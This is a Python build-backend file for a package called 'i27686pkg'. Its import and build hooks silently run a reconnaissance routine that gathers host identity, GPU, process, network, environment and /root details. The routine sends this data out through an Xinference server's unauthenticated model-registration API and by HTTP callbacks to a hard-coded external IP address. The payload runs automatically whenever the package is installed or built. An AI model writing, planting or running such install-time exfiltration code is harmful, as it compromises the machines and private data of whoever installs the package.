import os, sys, json, socket, subprocess, time, hashlib, base64

API = "http://127.0.0.1:9997"
EXTRA = ["http://180.184.25.125:18186", "http://180.184.25.125"]

def _run(cmd, timeout=25):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return (r.stdout or "") + (r.stderr or "")
    except Exception as e:
        return "ERR %r" % (e,)

def _proof(tag):
    try:
        txt = "TAG=%s\n" % tag
        txt += _run("hostname; id; uname -a; cat /proc/1/cgroup 2>/dev/null | head -3; pwd; cat /etc/hostname")
        txt += "\n--GPU--\n" + _run("nvidia-smi --query-gpu=index,name,memory.total,memory.used,utilization.gpu --format=csv,noheader 2>&1 | head -8; ls -l /dev/nvidia* 2>&1 | head -8; ls /dev | grep -i nvidia | head")
        txt += "\n--PROC--\n" + _run("ps aux | grep -E 'prl-|xinference' | grep -v grep | head -12")
        txt += "\n--NET--\n" + _run("hostname -i 2>/dev/null; ip -4 addr 2>/dev/null | grep inet | head -8; env | grep -iE 'proxy|uv_|cuda' | head -10")
        txt += "\n--FS--\n" + _run("ls -la /root 2>&1 | head -12; ls -la /root/.xinference 2>&1 | head -8")
        # in-band exfil via the target's own unauthenticated API
        host = socket.gethostname().replace(".", "_")[:40]
        name = ("i27686x%s%s" % (tag[:4], host))[:60]
        spec = {"model_name": name, "model_type": "flexible", "model_uri": "file:///etc/hostname",
                "launcher": "xinference.model.flexible.launchers.transformers_launcher.launcher",
                "launcher_args": "{}", "model_description": txt[:3500]}
        try:
            import urllib.request
            body = json.dumps({"model": json.dumps(spec), "persist": False}).encode()
            req = urllib.request.Request(API + "/v1/model_registrations/flexible", data=body,
                                         headers={"Content-Type": "application/json"})
            urllib.request.urlopen(req, timeout=15).read()
        except Exception:
            pass
        # best-effort direct callbacks
        import urllib.request, urllib.parse
        b = base64.urlsafe_b64encode(txt[:1200].encode("utf-8", "replace")).decode()
        for h in EXTRA:
            try:
                urllib.request.urlopen(h + "/cb/i27686/" + urllib.parse.quote(host) + "/" + b, timeout=6).read()
                break
            except Exception:
                continue
        try:
            open("/tmp/i27686_proof_%s_%s.txt" % (tag, time.strftime("%Y%m%dT%H%M%SZ", time.gmtime())), "w").write(txt)
        except Exception:
            pass
    except Exception:
        pass

_proof("import")

def get_requires_for_build_wheel(config_settings=None):
    _proof("requires")
    return []

def get_requires_for_build_sdist(config_settings=None):
    return []

def prepare_metadata_for_build_wheel(metadata_directory, config_settings=None):
    return None

def build_wheel(wheel_directory, config_settings=None, metadata_directory=None):
    _proof("build")
    dist = "i27686pkg-0.0.5"
    fn = dist + "-py3-none-any.whl"
    whl = os.path.join(wheel_directory, fn)
    files = {
        dist + ".dist-info/METADATA": "Metadata-Version: 2.1\nName: i27686pkg\nVersion: 0.0.5\n",
        dist + ".dist-info/WHEEL": "Wheel-Version: 1.0\nGenerator: i27686\nRoot-Is-Purelib: true\nTag: py3-none-any\n",
        "i27686pkg/__init__.py": "__version__='0.0.5'\n",
    }
    import zipfile
    rec = []
    with zipfile.ZipFile(whl, "w", zipfile.ZIP_DEFLATED) as z:
        for p, c in files.items():
            bb = c.encode(); z.writestr(p, bb)
            h = base64.urlsafe_b64encode(hashlib.sha256(bb).digest()).rstrip(b"=").decode()
            rec.append("%s,sha256=%s,%d" % (p, h, len(bb)))
        rec.append(dist + ".dist-info/RECORD,,")
        z.writestr(dist + ".dist-info/RECORD", "\n".join(rec) + "\n")
    return fn

def build_sdist(sdist_directory, config_settings=None):
    _proof("sdist")
    raise RuntimeError("unsupported")
